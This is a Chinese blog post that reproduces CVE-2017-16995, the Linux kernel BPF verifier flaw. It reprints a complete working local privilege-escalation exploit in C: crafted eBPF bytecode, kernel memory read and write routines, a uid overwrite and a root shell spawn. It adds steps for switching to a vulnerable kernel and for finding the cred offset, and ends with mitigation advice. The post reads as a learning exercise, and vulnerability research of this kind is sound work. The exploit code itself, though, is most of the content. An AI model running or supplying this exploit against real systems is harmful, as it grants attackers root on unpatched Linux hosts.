---
layout: post
title: "简单复现CVE-2017-16995"
categories: [漏洞复现]

---
# 前言
源于有个同学的课设是复现安全漏洞，刚好自己也没尝试过，借此机会找了一个看起来相对容易复现的漏洞体会一下复现过程。
# 漏洞概述
![](https://i.loli.net/2018/10/05/5bb6cc3580a5c.png)
内核中Berkeley Packet Filter（BPF）实现中, Linux内核4.14.8版本开始kernel/bpf/ verifier.c源码中的check_alu_op函数启用了不正确地执行符号扩展,可导致内存任意读写漏洞。一般用户可利用这个漏洞，实现任意代码，获得本地提权操作。

- 影响版本： 
- Linux内核：Linux Kernel Version 4.14 ~ 4.4 
- Ubuntu版本：16.04.01~ 16.04.04
- 主要影响Debian和Ubuntu发行版，Redhat和CentOS不受影响

# 环境搭建
![](https://i.loli.net/2018/10/05/5bb6cedde4b50.png)
看了一下平时用的ubuntu版本和linux内核刚好是在受影响的范围里，遂直接用这个来尝试。

# POC
事先下载了原作者的EXP代码（才知道poc是Proof of Concept的缩写，意思是为观点提供证据），代码不长。

    /*
     * Ubuntu 16.04.4 kernel priv esc
     *
     * all credits to @bleidl
     * - vnik
     */
    
    // Tested on:
    // 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
    // if different kernel adjust CRED offset + check kernel stack size
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <string.h>
    #include <linux/bpf.h>
    #include <linux/unistd.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <sys/un.h>
    #include <sys/stat.h>
    #include <stdint.h>
    
    #define PHYS_OFFSET 0xffff880000000000
    #define CRED_OFFSET 0x5f8
    #define UID_OFFSET 4
    #define LOG_BUF_SIZE 65536
    #define PROGSIZE 328
    
    int sockets[2];
    int mapfd, progfd;
    
    char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
    		"\x55\x09\x02\x00\xff\xff\xff\xff"
    		"\xb7\x00\x00\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x18\x19\x00\x00\x03\x00\x00\x00"
    		"\x00\x00\x00\x00\x00\x00\x00\x00"
    		"\xbf\x91\x00\x00\x00\x00\x00\x00"
    		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
    		"\x07\x02\x00\x00\xfc\xff\xff\xff"
    		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
    		"\x85\x00\x00\x00\x01\x00\x00\x00"
    		"\x55\x00\x01\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x79\x06\x00\x00\x00\x00\x00\x00"
    		"\xbf\x91\x00\x00\x00\x00\x00\x00"
    		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
    		"\x07\x02\x00\x00\xfc\xff\xff\xff"
    		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
    		"\x85\x00\x00\x00\x01\x00\x00\x00"
    		"\x55\x00\x01\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x79\x07\x00\x00\x00\x00\x00\x00"
    		"\xbf\x91\x00\x00\x00\x00\x00\x00"
    		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
    		"\x07\x02\x00\x00\xfc\xff\xff\xff"
    		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
    		"\x85\x00\x00\x00\x01\x00\x00\x00"
    		"\x55\x00\x01\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x79\x08\x00\x00\x00\x00\x00\x00"
    		"\xbf\x02\x00\x00\x00\x00\x00\x00"
    		"\xb7\x00\x00\x00\x00\x00\x00\x00"
    		"\x55\x06\x03\x00\x00\x00\x00\x00"
    		"\x79\x73\x00\x00\x00\x00\x00\x00"
    		"\x7b\x32\x00\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x55\x06\x02\x00\x01\x00\x00\x00"
    		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00"
    		"\x7b\x87\x00\x00\x00\x00\x00\x00"
    		"\x95\x00\x00\x00\x00\x00\x00\x00";
    
    char bpf_log_buf[LOG_BUF_SIZE];
    
    static int bpf_prog_load(enum bpf_prog_type prog_type,
    		  const struct bpf_insn *insns, int prog_len,
    		  const char *license, int kern_version) {
    	union bpf_attr attr = {
    		.prog_type = prog_type,
    		.insns = (__u64)insns,
    		.insn_cnt = prog_len / sizeof(struct bpf_insn),
    		.license = (__u64)license,
    		.log_buf = (__u64)bpf_log_buf,
    		.log_size = LOG_BUF_SIZE,
    		.log_level = 1,
    	};
    
    	attr.kern_version = kern_version;
    
    	bpf_log_buf[0] = 0;
    
    	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    }
    
    static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
    		   int max_entries) {
    	union bpf_attr attr = {
    		.map_type = map_type,
    		.key_size = key_size,
    		.value_size = value_size,
    		.max_entries = max_entries
    	};
    
    	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    }
    
    static int bpf_update_elem(uint64_t key, uint64_t value) {
    	union bpf_attr attr = {
    		.map_fd = mapfd,
    		.key = (__u64)&key,
    		.value = (__u64)&value,
    		.flags = 0,
    	};
    
    	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
    }
    
    static int bpf_lookup_elem(void *key, void *value) {
    	union bpf_attr attr = {
    		.map_fd = mapfd,
    		.key = (__u64)key,
    		.value = (__u64)value,
    	};
    
    	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    }
    
    static void __exit(char *err) {
    	fprintf(stderr, "error: %s\n", err);
    	exit(-1);
    }
    
    static void prep(void) {
    	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
    	if (mapfd < 0)
    		__exit(strerror(errno));
    
    	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
    			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);
    
    	if (progfd < 0)
    		__exit(strerror(errno));
    
    	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
    		__exit(strerror(errno));
    
    	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
    		__exit(strerror(errno));
    }
    
    static void writemsg(void) {
    	char buffer[64];
    
    	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
    
    	if (n < 0) {
    		perror("write");
    		return;
    	}
    	if (n != sizeof(buffer))
    		fprintf(stderr, "short write: %lu\n", n);
    }
    
    #define __update_elem(a, b, c) \
    	bpf_update_elem(0, (a)); \
    	bpf_update_elem(1, (b)); \
    	bpf_update_elem(2, (c)); \
    	writemsg();
    
    static uint64_t get_value(int key) {
    	uint64_t value;
    
    	if (bpf_lookup_elem(&key, &value))
    		__exit(strerror(errno));
    
    	return value;
    }
    
    static uint64_t __get_fp(void) {
    	__update_elem(1, 0, 0);
    
    	return get_value(2);
    }
    
    static uint64_t __read(uint64_t addr) {
    	__update_elem(0, addr, 0);
    
    	return get_value(2);
    }
    
    static void __write(uint64_t addr, uint64_t val) {
    	__update_elem(2, addr, val);
    }
    
    static uint64_t get_sp(uint64_t addr) {
    	return addr & ~(0x4000 - 1);
    }
    
    static void pwn(void) {
    	uint64_t fp, sp, task_struct, credptr, uidptr;
    
    	fp = __get_fp();
    	if (fp < PHYS_OFFSET)
    		__exit("bogus fp");
    	
    	sp = get_sp(fp);
    	if (sp < PHYS_OFFSET)
    		__exit("bogus sp");
    	
    	task_struct = __read(sp);
    
    	if (task_struct < PHYS_OFFSET)
    		__exit("bogus task ptr");
    
    	printf("task_struct = %lx\n", task_struct);
    
    	credptr = __read(task_struct + CRED_OFFSET); // cred
    
    	if (credptr < PHYS_OFFSET)
    		__exit("bogus cred ptr");
    
    	uidptr = credptr + UID_OFFSET; // uid
    	if (uidptr < PHYS_OFFSET)
    		__exit("bogus uid ptr");
    
    	printf("uidptr = %lx\n", uidptr);
    	__write(uidptr, 0); // set both uid and gid to 0
    
    	if (getuid() == 0) {
    		printf("spawning root shell\n");
    		system("/bin/bash");
    		exit(0);
    	}
    
    	__exit("not vulnerable?");
    }
    
    int main(int argc, char **argv) {
    	prep();
    	pwn();
    
    	return 0;
    }

但是编译执行的时候出现问题
![](https://i.loli.net/2018/10/05/5bb6d1bf4fde5.png)
看了看网上其他人的复现，多数采用的内核都是4.4，可能老版本的问题已经修复了？就顺便学习一下切换内核的操作吧。

## 更换内核
    apt-cache search linux
首先搜索版本，选择合适的

    4.4.0-81-generic，sudo apt-get install linux-headers-4.4.0-81-generic linux-image-4.4.0-81-generic

选择了4.4.0-81，下载资源。
    
    sudo su 
    nano /boot/grub/grub.cfg

切换到root对/boot/grub/grub.cfg文件进行编辑
![](https://i.loli.net/2018/10/05/5bb6de5c6b46e.png)

修改后ctrl+o 然后enter保存到此文件，ctrl+x退出。
最后重启电脑，检查内核信息。
![](https://i.loli.net/2018/10/05/5bb6de956fd6b.png)

![](https://i.loli.net/2018/10/05/5bb6debda0787.png)
再次尝试编译执行，成功提权。

# 修复建议
- 1、通过修改内核参数限制普通用户使用bpf(2)系统调用：
    
    $ sudo sysctl kernel.unprivileged_bpf_disabled=1
    
    $ echo kernel.unprivileged_bpf_disabled=1 | sudo tee /etc/sysctl.d/90-CVE-2017-16995-CVE-2017-16996.conf

- 2、  升级 Linux Kernel 版本，需重启服务器生效

# 关于BPF
查了一下BPF这种“伯克利包过滤”语法，是一个工作在操作系统内核的数据包捕获机制，他先将链路层的数据包捕获再过滤，最后提供给应用层特定的过滤后的数据包。许多版本UNIX和Linux平台上多数嗅探器都是基于BPF开发的。

linux的用户层和内核层是隔离的，想让内核执行用户的代码，是需要编写内核模块，但是内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。

更多关于BPF的加载过程以及安全校验并未深入了解，阅读了一位大佬结合EXP分析的漏洞执行过程，附上链接。
[https://www.cnblogs.com/rebeyond/p/8921307.html](https://www.cnblogs.com/rebeyond/p/8921307.html)

# 关于CRED_OFFSET
虽然更换了内核版本后直接提权成功了，但是我们注意到在EXP的开头有这样一句注释。

    if different kernel adjust CRED offset + check kernel stack size

也就是说

 `#define CRED_OFFSET 0x5f8`

这个偏移量可能因为内核版本不同、内核编译选项不同而出现差异，我们用的内核版本刚好是和原作者的相同，所以并未出现问题。如若版本不同提权失败，我们需要找方法获取CRED的偏移量。

这里有两种方法获取。

## 第一种

编写一个getCredOffset模块注入内核。

    #include <linux/kernel.h>
    #include <linux/module.h>
    #include <linux/init.h>
    #include <linux/slab.h>
    #include <linux/kthread.h>
    #include <linux/errno.h>
    #include <linux/types.h>
    int init_module()
    {
    printk("[!]current cred offset:%x\n",(unsigned long)&(current->cred)-(unsigned long)current);
    return 0;
    }
    void cleanup_module()
    {
    printk("module cleanup\n");
    }

编写Makefile
![](https://i.loli.net/2018/10/06/5bb831ff2667b.png)

编译
![](https://i.loli.net/2018/10/06/5bb831d626500.png)

把getCredOffset模块注入内核
![](https://i.loli.net/2018/10/06/5bb832389a452.png)

执行命令获取cred偏移量
![](https://i.loli.net/2018/10/06/5bb832865d564.png)

这个方法简单直接，但是问题也很明显。我们的目的是利用这个漏洞来获取root权限，但是在这一步获取cred offset的时候就需要用到root权限，这显然是不合适的。那么我们再来看第二个方法。

## 第二种
文章的作者这样描述
> 这个漏洞是个任意地址读写漏洞，所以也可以在确定task_struct地址之后，以当前用户的uid为特征去搜索内存，毕竟cred离task_struct不远。

这里我需要去复习一下操作系统的知识了……自从上学期课设结束后还几乎没有再了解这些东西，刚刚的makefile也是现学的……

那么首先什么是task_struct？

每个进程在内核中都有一个进程控制块(PCB)来维护进程相关的信息,Linux内核的进程控制块是task_struct结构体。

task_struct是Linux内核的一种数据结构，可以在 include/linux/sched.h 中找到它。它会被装载到RAM中并且包含着进程的信息。每个进程都把它的信息放在 task_struct 这个数据结构体。

我们可以尝试以不同的cred offset来获取两个uid来进行对比，一旦对比上，姑且就当做找到了这个“确定”的值，然后再去write(0)。

爆破得出credoffset。

# 参考来源

[https://www.jianshu.com/p/75b368f85dc6](https://www.jianshu.com/p/75b368f85dc6)

[http://www.freebuf.com/news/165608.html](http://www.freebuf.com/news/165608.html)

[https://www.cnblogs.com/rebeyond/p/8603056.html#commentform](https://www.cnblogs.com/rebeyond/p/8603056.html#commentform)
